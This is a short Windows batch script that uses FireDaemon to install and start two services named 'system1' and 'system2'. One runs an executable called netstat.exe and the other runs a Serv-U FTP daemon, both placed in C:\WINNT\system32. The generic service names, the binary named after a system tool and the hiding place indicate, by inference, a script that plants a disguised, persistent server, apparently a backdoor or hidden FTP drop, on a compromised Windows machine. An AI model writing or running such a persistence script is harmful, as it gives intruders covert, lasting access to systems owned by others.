@echo off
echo Setting Environment Variable

SET MXHOME=C:\WINNT\system32
SET MXBIN=C:\WINNT\system32

echo Installing system1 as a System Service..
C:\WINNT\system32\firedaemon -i system1 "C:\WINNT\system32" "C:\WINNT\system32\netstat.exe" "acomp.pnf" Y 0 0 0 Y

echo Installing system2 as a System Service..
C:\WINNT\system32\firedaemon -i system2 "C:\WINNT\system32" "C:\WINNT\system32\ServUDaemon.exe" "" Y 0 0 0 Y

echo Starting Service: "system1"..
net start system1
echo Starting Service: "system2"..
net start system2